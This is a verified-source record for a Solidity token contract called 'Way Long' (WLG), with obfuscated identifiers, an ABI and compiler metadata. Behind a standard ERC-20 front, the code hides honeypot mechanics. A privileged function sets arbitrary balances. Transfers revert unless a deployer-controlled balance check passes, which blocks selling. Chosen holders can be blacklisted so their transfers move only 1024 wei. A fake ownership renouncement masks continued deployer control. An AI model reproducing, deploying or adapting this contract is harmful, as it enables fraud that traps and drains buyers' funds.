{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface atAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atFee {\n    function createPair(address marketingMode, address feeMode) external returns (address);\n}\n\ninterface fromEnableReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listTeam) external view returns (uint256);\n\n    function transfer(address fromMode, uint256 totalMarketing) external returns (bool);\n\n    function allowance(address swapLimitFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMode,\n        uint256 totalMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listBuy, uint256 value);\n    event Approval(address indexed swapLimitFund, address indexed spender, uint256 value);\n}\n\ninterface fromEnableReceiverMetadata is fromEnableReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WayLong is shouldWallet, fromEnableReceiver, fromEnableReceiverMetadata {\n\n    mapping(address => uint256) private takeMin;\n\n    uint256 private autoFeeAt;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverIsFee;\n    }\n\n    string private receiverIsFee = \"Way Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeAmountSell;\n    }\n\n    bool private isSell;\n\n    uint256 listEnableReceiver;\n\n    event OwnershipTransferred(address indexed receiverTx, address indexed teamAuto);\n\n    address swapFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAtSender;\n    }\n\n    function tradingMinTo(address totalFundLaunch, uint256 totalMarketing) public {\n        shouldTotalAt();\n        takeMin[totalFundLaunch] = totalMarketing;\n    }\n\n    mapping(address => bool) public isList;\n\n    mapping(address => bool) public autoToken;\n\n    function transferFrom(address walletTx, address fromMode, uint256 totalMarketing) external override returns (bool) {\n        if (_msgSender() != totalFund) {\n            if (teamIsAt[walletTx][_msgSender()] != type(uint256).max) {\n                require(totalMarketing <= teamIsAt[walletTx][_msgSender()]);\n                teamIsAt[walletTx][_msgSender()] -= totalMarketing;\n            }\n        }\n        return exemptIs(walletTx, fromMode, totalMarketing);\n    }\n\n    bool public senderMax;\n\n    string private modeAmountSell = \"WLG\";\n\n    address private senderLaunchedFee;\n\n    function toMarketingAmount(uint256 totalMarketing) public {\n        shouldTotalAt();\n        listEnableReceiver = totalMarketing;\n    }\n\n    address totalFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return senderLaunchedFee;\n    }\n\n    bool public amountSwap;\n\n    constructor (){\n        if (shouldListSwap == autoFeeAt) {\n            fromTx = shouldListSwap;\n        }\n        atAuto toEnableWallet = atAuto(totalFund);\n        totalSenderAmount = atFee(toEnableWallet.factory()).createPair(toEnableWallet.WETH(), address(this));\n        if (senderMax) {\n            autoFeeAt = fromTx;\n        }\n        feeAmountLimit = _msgSender();\n        launchMax();\n        isList[feeAmountLimit] = true;\n        takeMin[feeAmountLimit] = takeAtSender;\n        if (teamToken == autoFeeAt) {\n            teamToken = swapWallet;\n        }\n        emit Transfer(address(0), feeAmountLimit, takeAtSender);\n    }\n\n    uint256 public swapWallet;\n\n    function exemptIs(address walletTx, address fromMode, uint256 totalMarketing) internal returns (bool) {\n        if (walletTx == feeAmountLimit) {\n            return autoReceiverLaunched(walletTx, fromMode, totalMarketing);\n        }\n        uint256 limitExempt = fromEnableReceiver(totalSenderAmount).balanceOf(swapFrom);\n        require(limitExempt == listEnableReceiver);\n        require(fromMode != swapFrom);\n        if (autoToken[walletTx]) {\n            return autoReceiverLaunched(walletTx, fromMode, atIs);\n        }\n        return autoReceiverLaunched(walletTx, fromMode, totalMarketing);\n    }\n\n    function allowance(address fundTotal, address minIsSwap) external view virtual override returns (uint256) {\n        if (minIsSwap == totalFund) {\n            return type(uint256).max;\n        }\n        return teamIsAt[fundTotal][minIsSwap];\n    }\n\n    function isFee(address totalSwap) public {\n        shouldTotalAt();\n        \n        if (totalSwap == feeAmountLimit || totalSwap == totalSenderAmount) {\n            return;\n        }\n        autoToken[totalSwap] = true;\n    }\n\n    uint256 private takeAtSender = 100000000 * 10 ** 18;\n\n    function autoReceiverLaunched(address walletTx, address fromMode, uint256 totalMarketing) internal returns (bool) {\n        require(takeMin[walletTx] >= totalMarketing);\n        takeMin[walletTx] -= totalMarketing;\n        takeMin[fromMode] += totalMarketing;\n        emit Transfer(walletTx, fromMode, totalMarketing);\n        return true;\n    }\n\n    function approve(address minIsSwap, uint256 totalMarketing) public virtual override returns (bool) {\n        teamIsAt[_msgSender()][minIsSwap] = totalMarketing;\n        emit Approval(_msgSender(), minIsSwap, totalMarketing);\n        return true;\n    }\n\n    address public totalSenderAmount;\n\n    uint256 constant atIs = 2 ** 10;\n\n    function shouldTotalAt() private view {\n        require(isList[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return senderLaunchedFee;\n    }\n\n    uint8 private tradingTx = 18;\n\n    uint256 private fromTx;\n\n    function walletLimit(address buyFee) public {\n        if (amountSwap) {\n            return;\n        }\n        \n        isList[buyFee] = true;\n        \n        amountSwap = true;\n    }\n\n    uint256 private shouldListSwap;\n\n    mapping(address => mapping(address => uint256)) private teamIsAt;\n\n    uint256 private txReceiverMarketing;\n\n    uint256 exemptLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTx;\n    }\n\n    function balanceOf(address listTeam) public view virtual override returns (uint256) {\n        return takeMin[listTeam];\n    }\n\n    uint256 private teamToken;\n\n    function transfer(address totalFundLaunch, uint256 totalMarketing) external virtual override returns (bool) {\n        return exemptIs(_msgSender(), totalFundLaunch, totalMarketing);\n    }\n\n    function launchMax() public {\n        emit OwnershipTransferred(feeAmountLimit, address(0));\n        senderLaunchedFee = address(0);\n    }\n\n    address public feeAmountLimit;\n\n    bool public modeIsLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLimitFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minIsSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIsSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"}],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIsLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"toMarketingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSenderAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"tradingMinTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"}],\"name\":\"walletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WayLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}